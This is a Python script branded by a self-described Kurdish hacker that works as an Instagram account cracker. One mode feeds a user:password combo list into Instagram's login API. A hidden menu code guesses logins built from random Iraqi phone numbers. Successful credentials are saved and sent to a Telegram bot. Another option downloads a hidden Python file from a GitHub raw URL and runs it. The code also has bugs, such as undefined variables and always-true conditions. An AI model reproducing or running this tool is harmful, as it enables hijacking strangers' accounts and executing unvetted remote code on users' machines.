import os
from time import sleep
import wget
os.system("title " + " #Hama.ZW Was Here - @kurdhacker_hama_bn_dlaj")
clear = lambda : os.system('clear')

try:
	os.remove(".inst-22292922icj.py")
except:
	pass

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    

def close():
    input('- Press Enter To Exit /')
    sys.exit()

clear()
os.system('color a')
os.system("clear")


logo = """
\033[97m


  █████   █    ██  ▄▄▄       ██▀███  ▄▄▄█████▓▒███████▒
▒██▓  ██▒ ██  ▓██▒▒████▄    ▓██ ▒ ██▒▓  ██▒ ▓▒▒ ▒ ▒ ▄▀░
▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██ ░▄█ ▒▒ ▓██░ ▒░░ ▒ ▄▀▒░ 
░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▒██▀▀█▄  ░ ▓██▓ ░   ▄▀▒   ░
░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒░██▓ ▒██▒  ▒██▒ ░ ▒███████▒
░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░  ▒ ░░   ░▒▒ ▓░▒░▒
 ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░  ░▒ ░ ▒░    ░    ░░▒ ▒ ░ ▒
   ░   ░  ░░░ ░ ░   ░   ▒     ░░   ░   ░      ░ ░ ░ ░ ░
    ░       ░           ░  ░   ░                ░ ░    
                                              ░        

\033[1;97m--------------------------------------------------	
\033[1;97mAuther : Hama Z.w
\033[1;97mTelegram Channel : @kurdhacker_hama_bn_dlaj
\033[1;97mTelegram Group : @kurdhackerzw
\033[1;97mGithub : https://github.com/533hacker
\033[1;97m--------------------------------------------------

"""






print (logo)
h , b,s,block = 0,0,0,0
tele = input("Atawe Hack Krawakan Brwa Bo Telegramkat Y/N ?: ")
if "Y" in tele:
    id = input("ID Telegram : ")
    bot = input("Token Bot : ")
elif "y" in tele:
    id = input("ID Telegram : ")
    bot = input("Token BOT : ")
print("------------------------------------------")
ask = input("""[1] Checker Insta Combo
[2] Combo-Maker
----------------------------------------------
Halbzhera : """)
if ask == "33837397293":
   
    make = '0123456789'
    clear()
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(8))))
        user = '+96477' + us
        pasw = '077' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello New Account Hited\n====================\n[=] User : {user} \n[=] Pass : {pasw}\n====================\nCh : @Berlin_Tools")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
elif ask =="2":
	os.system("rm -rf .com83838bo2.py")
	combo = "https://raw.githubusercontent.com/hh119191955/comdnjdijwj/main/.com83838bo2.py"
	wget.download(combo)
	os.system("python3 .com83838bo2.py")
	
    
#==================================================================
elif ask =="1":
    assk = input("[+] Enter File Name : ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    clear()
   
    print("")
    print(f"\r                   [=] GOOD : {h} / Bad : {b} / CheckPoint : {s} / TimeOut : {block}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello New Account Hited By Warzone Cracker\n====================\n[=] User : {user} \n[=] Pass : {pasw}\n====================\nCh : @kurdhacker_hama_bn_dlaj")
         
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            sleep(309)
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    
